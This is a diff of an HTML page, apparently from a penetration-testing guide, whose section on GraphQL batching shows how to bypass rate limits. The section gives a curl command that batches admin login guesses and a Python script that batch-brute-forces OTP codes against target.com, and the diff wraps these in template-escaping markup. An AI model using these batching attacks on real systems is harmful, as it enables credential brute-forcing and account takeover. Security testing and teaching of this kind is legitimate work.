@@ -1785,7 +1785,7 @@
 <hr />
 <h3 id="733-batching-rate-limit-bypass">7.3.3 Batching — Rate Limit Bypass<a class="headerlink" href="#733-batching-rate-limit-bypass" title="Permanent link">&para;</a></h3>
 <p>GraphQL allows multiple operations in a single HTTP request. If rate limiting is applied per HTTP request rather than per operation, batching lets you send 1,000 operations in one request.</p>
-<div class="language-bash highlight"><span class="filename">graphql_batching.sh</span><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># 100 login attempts in one HTTP request:</span>
+<p _="%" endraw="endraw"><div class="language-bash highlight"><span class="filename">graphql_batching.sh</span><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># 100 login attempts in one HTTP request:</span>
 </span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>https://target.com/graphql<span class="w"> </span><span class="se">\</span>
 </span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
 </span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;[</span>
@@ -1794,6 +1794,7 @@
 </span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="s1">    {&quot;query&quot;: &quot;mutation { login(email: \&quot;admin@target.com\&quot;, password: \&quot;pass3\&quot;) { token } }&quot;}</span>
 </span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="s1">  ]&#39;</span>
 </span></code></pre></div>
+{% raw %}
 <div class="language-python highlight"><span class="filename">batch_otp_bruteforce.py</span><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1"># OTP brute-force via batching — 1000 codes in one request:</span>
 </span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
 </span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
@@ -1808,7 +1809,7 @@
 </span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a><span class="c1"># Then:</span>
 </span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a><span class="c1"># curl -X POST https://target.com/graphql -d @batch_otp.json | \</span>
 </span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a><span class="c1">#   jq &#39;.[] | select(.data.verifyOTP.success == true)&#39;</span>
-</span></code></pre></div>
+</span></code></pre></div></p>
 <hr />
 <h3 id="734-nested-query-dos">7.3.4 Nested Query DoS<a class="headerlink" href="#734-nested-query-dos" title="Permanent link">&para;</a></h3>
 <p>If the schema allows recursive types (a <code>User</code> has <code>friends</code> which returns <code>[User]</code> which has <code>friends</code>...), deeply nested queries cause exponential database load.</p>
